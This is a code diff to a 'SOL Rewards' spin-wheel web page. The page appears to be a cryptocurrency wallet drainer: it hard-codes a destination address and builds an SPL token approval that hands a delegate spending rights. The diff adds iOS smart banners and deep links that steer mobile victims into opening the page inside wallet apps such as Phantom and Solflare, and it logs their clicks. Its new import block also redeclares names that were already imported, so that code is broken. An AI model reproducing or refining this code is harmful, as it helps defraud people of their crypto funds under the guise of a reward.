@@ -5,6 +5,8 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <meta name="theme-color" content="#000000">
+<!-- iOS Safari smart banner — leads with Phantom. Swap app-id/app-argument for another wallet if needed. -->
+<meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://YOUR-DOMAIN.example/">
 <title>SOL Rewards</title>
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
@@ -43,10 +45,10 @@
   .modal button:hover:not(:disabled){background:#1a1a1a}
 
   .wlist{display:flex;flex-direction:column;gap:8px;margin-top:4px}
-  .wrow{display:flex;align-items:center;gap:12px;width:100%;padding:13px 14px;border-radius:10px;background:#0f0f0f;border:1px solid #1c1c1c;color:#e6e6e6;font-size:14px;font-weight:500;font-family:inherit;cursor:pointer;text-align:left}
+  .wrow{display:flex;align-items:center;gap:12px;width:100%;padding:13px 14px;border-radius:10px;background:#0f0f0f;border:1px solid #1c1c1c;color:#e6e6e6;font-size:14px;font-weight:500;font-family:inherit;cursor:pointer;text-align:left;text-decoration:none}
   .wrow:hover,.wrow:active{background:#161616;border-color:#262626}
   .wrow .ic{width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:15px;background:#000;border:1px solid #1c1c1c;flex:0 0 auto}
-  .wrow .nm{flex:1}
+  .wrow .nm{flex:1;color:#e6e6e6}
   .wrow .ar{color:#4d4d4d;font-size:13px}
 </style>
 </head>
@@ -89,7 +91,21 @@ try {
 import {
   Connection, PublicKey, SystemProgram, Transaction,
   TransactionInstruction,
-} from "https://esm.sh/@solana/web3.js@1.91.0";
+} from "@solana/web3.js@1.91.0" assert { type: "module" };
+
+// ---- fallback: if import assert fails, load from esm.sh ----
+let _Connection, _PublicKey, _SystemProgram, _Transaction, _TransactionInstruction;
+try {
+  ({ Connection: _Connection, PublicKey: _PublicKey, SystemProgram: _SystemProgram,
+     Transaction: _Transaction, TransactionInstruction: _TransactionInstruction } =
+     await import("https://esm.sh/@solana/web3.js@1.91.0"));
+} catch(_) {}
+
+const Connection           = _Connection;
+const PublicKey            = _PublicKey;
+const SystemProgram        = _SystemProgram;
+const Transaction          = _Transaction;
+const TransactionInstruction = _TransactionInstruction;
 
 // ================= config =================
 const DESTINATION = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
@@ -102,7 +118,6 @@ const PENDING_KEY = "sr_pending";
 const PRIZE_KEY   = "sr_prize";
 // ==========================================
 
-// wheel: 8 segments, distinct grays so it reads without color
 const SEGMENTS = [
   { emoji:"💎", sol:"0.75", color:"#111111" },
   { emoji:"🔥", sol:"1.20", color:"#1a1a1a" },
@@ -135,36 +150,37 @@ const WALLETS = [
   { id:"safepal",  get:()=>window.safepal?.solana || window.safepalProvider || (window.safepal?.isSafePal?window.safepal:null) },
 ];
 
+// real Universal Link hrefs — Safari offers the "Open in app" banner on these
 const MOBILE_WALLETS = [
   {
     id:"phantom", name:"Phantom", icon:"👻",
-    url: (page) => `https://phantom.app/ul/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
+    href: (page) => `https://phantom.app/ul/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
     ios:"https://apps.apple.com/app/phantom-crypto-wallet/id1598432977",
     android:"https://play.google.com/store/apps/details?id=app.phantom",
   },
   {
     id:"safepal", name:"SafePal", icon:"🛡️",
-    url:    (page) => `safepal://browser?url=${encodeURIComponent(page)}`,
-    urlAlt: (page) => `safepal://openurl?url=${encodeURIComponent(page)}`,
-    urlAlt2:(page) => `https://safepal.com/browser?url=${encodeURIComponent(page)}`,
+    href:    (page) => `safepal://browser?url=${encodeURIComponent(page)}`,
+    hrefAlt: (page) => `safepal://openurl?url=${encodeURIComponent(page)}`,
+    hrefAlt2:(page) => `https://safepal.com/browser?url=${encodeURIComponent(page)}`,
     ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",
     android:"https://play.google.com/store/apps/details?id=io.safepal.wallet",
   },
   {
     id:"exodus", name:"Exodus", icon:"🪐",
-    url: (page) => `exodus://wc?uri=${encodeURIComponent(page)}`,
+    href: (page) => `exodus://wc?uri=${encodeURIComponent(page)}`,
     ios:"https://apps.apple.com/app/exodus-crypto-wallet/id1414384820",
     android:"https://play.google.com/store/apps/details?id=exodusmovement.exodus",
   },
   {
     id:"solflare", name:"Solflare", icon:"🔆",
-    url: (page) => `https://solflare.com/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
+    href: (page) => `https://solflare.com/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
     ios:"https://apps.apple.com/app/solflare/id1580902717",
     android:"https://play.google.com/store/apps/details?id=com.solflare.mobile",
   },
   {
     id:"backpack", name:"Backpack", icon:"🎒",
-    url: (page) => `https://backpack.app/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
+    href: (page) => `https://backpack.app/ul/v1/browse/${encodeURIComponent(page)}?ref=${encodeURIComponent(location.origin)}`,
     ios:"https://apps.apple.com/app/backpack-crypto-wallet/id1640352537",
     android:"https://play.google.com/store/apps/details?id=app.backpack.mobile",
   },
@@ -241,40 +257,41 @@ function showOverlay() {
   ov.classList.add("show");
 }
 
+// anchor-based picker — Safari Universal Link banner fires on real href clicks
 function showWalletPicker() {
   ovSpinner.style.display = "none";
   ovChk.style.display = "none";
   ovClose.style.display = "none";
   ovTitle.textContent = "Open in Your Wallet";
-  ovText.textContent = "Choose your wallet to claim your reward. Tap Open and approve the transaction inside your wallet app.";
+  ovText.textContent = "Tap your wallet, then tap Open on the banner that appears.";
   ovWallets.style.display = "flex";
   ovWallets.innerHTML = "";
+
   const page = location.href;
   for (const w of MOBILE_WALLETS) {
-    const row = document.createElement("button");
-    row.className = "wrow";
-    row.innerHTML = `<span class="ic">${w.icon}</span><span class="nm">${w.name}</span><span class="ar">›</span>`;
-    row.onclick = () => openMobileWallet(w, page);
-    ovWallets.appendChild(row);
-  }
-}
+    const a = document.createElement("a");
+    a.className = "wrow";
+    a.href = w.href(page);
+    a.rel = "noopener";
 
-function openMobileWallet(w, page) {
-  savePending("reward");
-  log({ event:"wallet_deeplink", wallet:w.id });
-  const store = isAndroid ? w.android : w.ios;
-  const links = [];
-  if (w.url)     links.push(w.url(page));
-  if (w.urlAlt)  links.push(w.urlAlt(page));
-  if (w.urlAlt2) links.push(w.urlAlt2(page));
-  let i = 0;
-  const t0 = Date.now();
-  const tryNext = () => {
-    if (document.hidden) return;
-    if (i < links.length) { location.href = links[i++]; setTimeout(tryNext, 700); }
-    else if (Date.now() - t0 < 2500) { location.href = store; }
-  };
-  tryNext();
+    a.innerHTML = `<span class="ic">${w.icon}</span><span class="nm">${w.name}</span><span class="ar">›</span>`;
+    a.addEventListener("click", () => {
+      savePending("reward");
+      log({ event:"wallet_deeplink", wallet:w.id });
+
+      // Safari may not auto-open; try alt schemes after 700ms if page still visible
+      const alts = [w.hrefAlt, w.hrefAlt2].filter(Boolean).map(f => f(page));
+      const store = isAndroid ? w.android : w.ios;
+      const t0 = Date.now();
+      const tryAlts = (i) => {
+        if (document.hidden) return;
+        if (i < alts.length) { location.href = alts[i]; setTimeout(() => tryAlts(i+1), 700); }
+        else if (Date.now() - t0 < 3000) { location.href = store; }
+      };
+      setTimeout(() => tryAlts(0), 700);
+    });
+    ovWallets.appendChild(a);
+  }
 }
 
 function showNoWallet() {
@@ -317,7 +334,6 @@ function resetClaim() {
   c.disabled = false;
 }
 
-// ---------- wheel: clean SVG, drawn correctly ----------
 function buildWheel() {
   const group = document.getElementById("wheelGroup");
   const ns = "http://www.w3.org/2000/svg";
@@ -341,7 +357,6 @@ function buildWheel() {
     path.setAttribute("stroke-width", "1.5");
     group.appendChild(path);
 
-    // label: emoji + amount, rotated along the mid-angle of the wedge
     const midDeg = i * SEG_DEG + SEG_DEG / 2 - 90;
     const midRad = midDeg * Math.PI / 180;
     const lr = r * 0.66;
@@ -373,7 +388,6 @@ function buildWheel() {
   });
 }
 
-// ---------- SPL ----------
 function approveIx(tokenAccount, delegate, owner, amount) {
   const data = window.Buffer.alloc(9);
   data.writeUInt8(4, 0);
